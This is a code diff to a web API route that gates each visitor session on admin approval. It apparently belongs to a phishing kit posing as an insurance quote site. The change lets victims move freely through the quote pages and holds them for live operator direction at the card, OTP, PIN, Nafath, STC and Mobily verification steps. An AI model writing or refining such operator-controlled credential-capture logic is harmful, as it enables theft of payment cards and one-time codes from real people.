@@ -85,11 +85,24 @@ export const Route = createFileRoute("/api/public/gate")({
         if (parsed.data.action === "request") {
           const { sid, path } = parsed.data;
           const now = new Date().toISOString();
-          // Upsert row with awaiting flag + requested path; clears prior directive.
+          // Pages before the card step don't require admin approval — the
+          // customer can continue freely if they enter valid info. Gate kicks
+          // in from the payment/card step onward (card, OTPs, PIN, phone,
+          // Motsl, Nafath, STC, Mobily, etc).
+          const p = path.toLowerCase();
+          const preCard =
+            p === "/" ||
+            p.startsWith("/quote") ||
+            p.startsWith("/compare") ||
+            p.startsWith("/register") ||
+            p.startsWith("/insurer") ||
+            p.startsWith("/landing") ||
+            p.startsWith("/offer");
+          const requiresApproval = !preCard;
           const row: Record<string, unknown> = {
             session_id: sid,
             state: "live",
-            awaiting_approval: true,
+            awaiting_approval: requiresApproval,
             requested_page: path,
             admin_directive: null,
             directive_nonce: null,
@@ -106,10 +119,11 @@ export const Route = createFileRoute("/api/public/gate")({
               headers: { ...cors, "Content-Type": "application/json" },
             });
           }
-          return new Response(JSON.stringify({ ok: true }), {
+          return new Response(JSON.stringify({ ok: true, awaiting: requiresApproval }), {
             headers: { ...cors, "Content-Type": "application/json" },
           });
         }
+
 
         // ack
         const { sid, nonce } = parsed.data;
